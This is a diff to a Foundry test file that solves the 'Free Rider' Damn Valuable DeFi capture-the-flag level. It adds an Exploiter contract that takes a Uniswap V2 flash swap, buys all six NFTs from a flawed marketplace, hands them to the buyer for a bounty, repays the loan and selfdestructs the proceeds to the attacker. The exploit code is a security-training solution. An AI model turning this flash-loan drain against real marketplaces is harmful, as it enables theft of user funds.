@@ -9,6 +9,7 @@ import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../../sr
 import {DamnValuableNFT} from "../../../src/Contracts/DamnValuableNFT.sol";
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {WETH9} from "../../../src/Contracts/WETH9.sol";
+import {ERC721Holder} from "openzeppelin-contracts/token/ERC721/utils/ERC721Holder.sol";
 
 contract FreeRider is Test {
     // The NFT marketplace will have 6 tokens, at 15 ETH each
@@ -135,7 +136,9 @@ contract FreeRider is Test {
          * EXPLOIT START *
          */
         vm.startPrank(attacker, attacker);
-
+        Exploiter exploiter =
+        new Exploiter(address(uniswapV2Pair), payable(address(freeRiderNFTMarketplace)), address(damnValuableNFT), payable(address(weth)), attacker, address(freeRiderBuyer));
+        exploiter.attack();
         vm.stopPrank();
         /**
          * EXPLOIT END *
@@ -165,4 +168,65 @@ contract FreeRider is Test {
         assertEq(freeRiderNFTMarketplace.amountOfOffers(), 0);
         assertLt(address(freeRiderNFTMarketplace).balance, MARKETPLACE_INITIAL_ETH_BALANCE);
     }
+}
+
+contract Exploiter is ERC721Holder, Test {
+    IUniswapV2Pair internal pair;
+    FreeRiderNFTMarketplace internal freeRiderNFTMarketplace;
+    DamnValuableNFT internal damnValuableNFT;
+    WETH9 internal weth;
+
+    address public attacker;
+
+    uint256 internal constant NFT_PRICE = 15 ether;
+    uint8 internal constant AMOUNT_OF_NFTS = 6;
+    address public freeRiderBuyer;
+
+    constructor(
+        address pairAddress,
+        address payable freeRiderNFTMarketplaceAddress,
+        address damnValuableNFTAddress,
+        address payable wethAddress,
+        address attackerAddress,
+        address freeRiderBuyerAddress
+    ) {
+        pair = IUniswapV2Pair(pairAddress);
+        freeRiderNFTMarketplace = FreeRiderNFTMarketplace(freeRiderNFTMarketplaceAddress);
+        damnValuableNFT = DamnValuableNFT(damnValuableNFTAddress);
+        weth = WETH9(wethAddress);
+        attacker = attackerAddress;
+        freeRiderBuyer = freeRiderBuyerAddress;
+    }
+
+    function attack() public {
+        bytes memory data = abi.encode(NFT_PRICE);
+        pair.swap(0, NFT_PRICE, address(this), data);
+    }
+
+    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
+        (uint256 amount) = abi.decode(data, (uint256));
+        uint256 fee = ((amount * 3) / 997) + 1;
+        uint256 amountToRepay = amount + fee;
+
+        weth.withdraw(amount);
+
+        uint256[] memory tokenIds = new uint256[](AMOUNT_OF_NFTS);
+        for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
+            tokenIds[tokenId] = tokenId;
+        }
+
+        freeRiderNFTMarketplace.buyMany{value: amount}(tokenIds);
+
+        for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
+            damnValuableNFT.safeTransferFrom(address(this), freeRiderBuyer, tokenId);
+        }
+
+        weth.deposit{value: amountToRepay}();
+
+        weth.transfer(address(pair), amountToRepay);
+
+        selfdestruct(payable(attacker));
+    }
+
+    receive() external payable {}
 }
